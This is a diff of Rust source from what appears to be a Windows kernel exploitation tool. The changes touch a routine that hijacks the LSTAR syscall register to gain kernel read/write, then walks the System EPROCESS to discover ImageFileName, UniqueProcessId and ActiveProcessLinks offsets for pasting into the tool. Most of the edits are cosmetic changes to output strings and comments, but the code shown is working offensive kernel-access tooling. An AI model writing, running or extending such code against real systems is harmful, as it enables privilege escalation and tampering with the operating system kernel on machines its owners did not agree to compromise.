@@ -274,19 +274,16 @@ fn validate_eprocess_walk(
 ///
 /// The printed constants can be pasted directly into eprocess.rs.
 pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
-    println!("[*] Setting up kernel read/write (one-time gadget scan + LSTAR hijack)...");
-    let (krw, pe) = open_krw(dev)?;
-
-    let mods = get_kernel_modules()?;
-    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
-    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
+    println!();
+    println!("[*] Hijacking LSTAR...");
+    let (krw, pe, nt) = open_krw(dev)?;
 
     let build = match find_export_va(&pe, nt.va, "NtBuildNumber") {
         Ok(va) => match krw.kread(va) {
             Ok(v) => {
                 let raw = v as u32;
                 let b = raw & 0xFFFF;
-                println!("[+] NtBuildNumber = {} (raw ULONG 0x{:08X})", b, raw);
+                println!("[+] NtBuildNumber = {} (ULONG 0x{:08X})", b, raw);
                 Some(b as u64)
             }
             Err(_) => None,
@@ -302,7 +299,6 @@ pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
     }
     println!("[+] System EPROCESS = 0x{:016X}", system_eproc);
 
-    // Large enough for recent Win10/11 builds (offsets can exceed 0x400).
     const WINDOW_BYTES: usize = 0x600;
     let mut eproc_mem: Vec<u64> = Vec::new();
     for i in 0..(WINDOW_BYTES / 8) {
@@ -314,18 +310,16 @@ pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
         eproc_bytes.extend_from_slice(&q.to_le_bytes());
     }
 
-    // --- ImageFileName ("System") ---
     let mut img_off: Option<u64> = None;
     let needle = b"System";
     for i in 0..eproc_bytes.len().saturating_sub(needle.len()) {
         if &eproc_bytes[i..i + needle.len()] == needle {
             img_off = Some(i as u64);
-            println!("[+] Found \"System\" at EPROCESS +0x{:X} (ImageFileName)", i);
+            println!("[+] Found \"System\" at EPROCESS +0x{:X}", i);
             break;
         }
     }
 
-    // --- UniqueProcessId + ActiveProcessLinks (validated as a pair) ---
     let pid_candidates: Vec<u64> = eproc_mem
         .iter()
         .enumerate()
@@ -341,9 +335,9 @@ pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
         if let Some((next, next_pid)) = validate_process_links(&krw, system_eproc, lo, po) {
             pid_off = Some(po);
             links_off = Some(lo);
-            println!("[+] UniqueProcessId at EPROCESS +0x{:X} (value 4)", po);
+            println!("[+] UniqueProcessId at EPROCESS +0x{:X}", po);
             println!(
-                "[+] ActiveProcessLinks at EPROCESS +0x{:X} (validated: next PID {})",
+                "[+] ActiveProcessLinks at EPROCESS +0x{:X} (Next PID: {})",
                 lo, next_pid
             );
             println!("    next EPROCESS = 0x{:016X}", next);
@@ -431,9 +425,8 @@ pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
         (None, None, None)
     };
 
-    // --- Print ready-to-paste block ---
     println!();
-    println!("   === Discovered Offsets ===");
+    println!("   ===== Discovered Offsets ======");
     if let Some(b) = build {
         println!("   NtBuildNumber = {} (0x{:X})", b, b);
         println!();
